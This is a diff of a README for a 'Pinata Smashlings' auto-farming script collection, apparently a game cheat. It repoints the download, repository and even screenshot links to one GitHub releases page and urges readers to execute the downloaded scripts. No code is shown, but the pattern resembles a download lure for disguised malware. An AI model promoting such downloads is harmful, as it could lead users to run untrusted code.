@@ -6,7 +6,7 @@ Welcome to the **Pinata Smashlings** repository! Here, you'll find a collection 
 
 To get started, download the scripts from the following link:
 
-[Download Scripts](https://github.com/repo/user/archive.zip)
+[Download Scripts](https://github.com/Mp40mp40/Pinata-Smashlings/releases)
 
 After downloading, extract the files and execute the necessary scripts to start your auto-farming adventure!
 
@@ -70,14 +70,14 @@ If you encounter any issues or have questions, please feel free to reach out. Yo
 
 For further information, please visit the official GitHub page:
 
-[Visit GitHub Repository](https://github.com/repo/user/archive.zip)
+[Visit GitHub Repository](https://github.com/Mp40mp40/Pinata-Smashlings/releases)
 
 ## 🎨 Screenshots
 
-![Pinata Smashlings Gameplay](https://example.com/image1.png)
+![Pinata Smashlings Gameplay](https://github.com/Mp40mp40/Pinata-Smashlings/releases)
 *Collecting coins with ease!*
 
-![Egg Hatching](https://example.com/image2.png)
+![Egg Hatching](https://github.com/Mp40mp40/Pinata-Smashlings/releases)
 *Hatching eggs while you relax!*
 
 ## 🎉 Acknowledgments
